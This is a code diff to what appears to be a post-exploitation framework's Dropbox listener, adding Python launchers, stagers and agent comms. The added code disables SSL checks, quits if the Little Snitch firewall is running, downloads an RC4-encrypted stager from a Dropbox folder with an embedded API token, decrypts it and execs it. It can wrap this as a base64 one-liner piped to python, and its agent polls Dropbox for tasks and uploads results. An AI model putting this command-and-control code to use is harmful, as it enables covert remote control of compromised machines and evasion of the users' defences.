@@ -240,8 +240,68 @@ class Listener:
                     # otherwise return the case-randomized stager
                     return stager
 
-            else:
-                print helpers.color("[!] listeners/dbx generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module.")
+            elif language.startswith('py'):
+                launcherBase = 'import sys;'
+                # monkey patch ssl woohooo
+                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+
+                try:
+                    if safeChecks.lower() == 'true':
+                        launcherBase += "import re, subprocess;"
+                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
+                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
+                        launcherBase += "out = ps.stdout.read()\n"
+                        launcherBase += "ps.stdout.close()\n"
+                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
+                        launcherBase += "   sys.exit()\n"
+                except Exception as e:
+                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
+                    print helpers.color(p, color='red')
+
+                if userAgent.lower() == 'default':
+                    profile = listenerOptions['DefaultProfile']['Value']
+                    userAgent = profile.split('|')[1]
+
+                launcherBase += "import urllib2;\n"
+                launcherBase += "UA='%s';" % (userAgent)
+                launcherBase += "t='%s';" % (apiToken)
+                launcherBase += "server='https://content.dropboxapi.com/2/files/download';"
+
+                launcherBase += "req=urllib2.Request(server);\n"
+                launcherBase += "req.add_header('User-Agent',UA);\n"
+                launcherBase += "req.add_header(\"Authorization\",\"Bearer \"+t);"
+                launcherBase += "req.add_header(\"Dropbox-API-Arg\",'{\"path\":\"%s/debugpy\"}');\n" % (stagingFolder)
+
+
+                launcherBase += "if urllib2.getproxies():\n"
+                launcherBase += "   o = urllib2.build_opener();\n"
+                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
+                launcherBase += "   urllib2.install_opener(o);\n"
+
+                launcherBase += "a=urllib2.urlopen(req).read();\n"
+                launcherBase += "IV=a[0:4];"
+                launcherBase += "data=a[4:];"
+                launcherBase += "key=IV+'%s';" % (stagingKey)
+
+                # RC4 decryption
+                launcherBase += "S,j,out=range(256),0,[]\n"
+                launcherBase += "for i in range(256):\n"
+                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
+                launcherBase += "i=j=0\n"
+                launcherBase += "for char in data:\n"
+                launcherBase += "    i=(i+1)%256\n"
+                launcherBase += "    j=(j+S[i])%256\n"
+                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
+                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "exec(''.join(out))"
+
+                if encode:
+                    launchEncoded = base64.b64encode(launcherBase)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    return launcher
+                else:
+                    return launcherBase
 
         else:
             print helpers.color("[!] listeners/dbx generate_launcher(): invalid listener name specification!")
@@ -259,6 +319,8 @@ class Listener:
         pollInterval = listenerOptions['PollInterval']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
         baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
+        apiToken = listenerOptions['APIToken']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
         stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))
 
         if language.lower() == 'powershell':
@@ -296,8 +358,32 @@ class Listener:
                 return randomizedStager
 
 
+        elif language.lower() == 'python':
+
+            f = open("%s/data/agent/stagers/dropbox.py" % (self.mainMenu.installPath))
+            stager = f.read()
+            f.close()
+
+            stager = helpers.strip_python_comments(stager)
+            # patch the server and key information
+            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
+            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
+            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
+            stager = stager.replace('REPLACE_PROFILE', profile)
+            stager = stager.replace('REPLACE_API_TOKEN', apiToken)
+
+            if encode:
+                return base64.b64encode(stager)
+            if encrypt:
+                # return an encrypted version of the stager ("normal" staging)
+                RC4IV = os.urandom(4)
+                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
+            else:
+                # otherwise return the standard stager
+                return stager
+
         else:
-            print helpers.color("[!] listeners/dbx generate_stager(): invalid language specification, only 'powershell' is currently supported for this module.")
+            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
     def generate_agent(self, listenerOptions, language=None):
@@ -344,9 +430,34 @@ class Listener:
                 code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
+        elif language == 'python':
+            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
+            code = f.read()
+            f.close()
 
+            #path in the comms methods
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            code = code.replace('REPLACE_COMMS', commsCode)
+
+            #strip out comments and blank lines
+            code = helpers.strip_python_comments(code)
+
+            #patch some more 
+            code = code.replace('delay = 60', 'delay = %s' % (delay))
+            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
+            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
+            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
+
+            # patch in the killDate and workingHours if they're specified
+            if killDate != "":
+                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+            if workingHours != "":
+                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
+
+            return code
         else:
-            print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' is currently supported for this module.")
+            print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -459,8 +570,90 @@ class Listener:
 
                 return updateServers + getTask + sendMessage
 
-            else:
-                print helpers.color("[!] listeners/dbx generate_comms(): invalid language specification, only 'powershell' is current supported for this module.")
+            elif language.lower() == 'python':
+
+                sendMessage = """
+def send_message(packets=None):
+    # Requests a tasking or posts data to a randomized tasking URI.
+    # If packets == None, the agent GETs a tasking from the control server.
+    # If packets != None, the agent encrypts the passed packets and
+    #    POSTs the data to the control server.
+
+    def post_message(uri, data, headers):
+        req = urllib2.Request(uri)
+        headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
+        for key, value in headers.iteritems():
+            req.add_header("%s"%(key),"%s"%(value))
+
+        if data:
+            req.add_data(data)
+
+        o=urllib2.build_opener()
+        o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))
+        urllib2.install_opener(o)
+
+        return urllib2.urlopen(req).read()
+
+    global missedCheckins
+    global headers
+    taskingsFolder="REPLACE_TASKSING_FOLDER"
+    resultsFolder="REPLACE_RESULTS_FOLDER"
+    data = None
+    requestUri=''
+    try:
+        del headers['Content-Type']
+    except:
+        pass
+
+    
+    if packets:
+        data = ''.join(packets)
+        # aes_encrypt_then_hmac is in stager.py
+        encData = aes_encrypt_then_hmac(key, data)
+        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+        #check to see if there are any results already present
+        
+        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
+        
+        try:
+            pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
+        except:
+            pkdata = None
+
+        if pkdata and len(pkdata) > 0:
+            data = pkdata + data
+
+        headers['Content-Type'] = "application/octet-stream"
+        requestUri = 'https://content.dropboxapi.com/2/files/upload'
+    else:
+        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
+        requestUri='https://content.dropboxapi.com/2/files/download'
+
+    try:
+        resultdata = post_message(requestUri, data, headers)
+        if (resultdata and len(resultdata) > 0) and requestUri.endswith('download'):
+            headers['Content-Type'] = "application/json"
+            del headers['Dropbox-API-Arg']
+            datastring="{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
+            nothing = post_message('https://api.dropboxapi.com/2/files/delete', datastring, headers)
+
+        return ('200', resultdata)
+
+    except urllib2.HTTPError as HTTPError:
+        # if the server is reached, but returns an erro (like 404)
+        return (HTTPError.code, '')
+
+    except urllib2.URLError as URLerror:
+        # if the server cannot be reached
+        missedCheckins = missedCheckins + 1
+        return (URLerror.reason, '')
+
+    return ('', '')
+"""
+                sendMessage = sendMessage.replace('REPLACE_TASKSING_FOLDER', taskingsFolder)
+                sendMessage = sendMessage.replace('REPLACE_RESULTS_FOLDER', resultsFolder)
+                sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
+                return sendMessage
         else:
             print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')
 
@@ -575,11 +768,14 @@ class Listener:
             dispatcher.send("[*] Dropbox folder '%s' already exists" % (resultsFolder), sender="listeners/dropbox")
 
         # upload the stager.ps1 code
-        stagerCode = self.generate_stager(listenerOptions=listenerOptions, language='powershell')
+        stagerCodeps = self.generate_stager(listenerOptions=listenerOptions, language='powershell')
+        stagerCodepy = self.generate_stager(listenerOptions=listenerOptions, language='python')
         try:
             # delete stager if it exists
             delete_file(dbx, "%s/debugps" % (stagingFolder))
-            dbx.files_upload(stagerCode, "%s/debugps" % (stagingFolder))
+            delete_file(dbx, "%s/debugpy" % (stagingFolder))
+            dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
+            dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
         except dropbox.exceptions.ApiError:
             print helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder))
             return
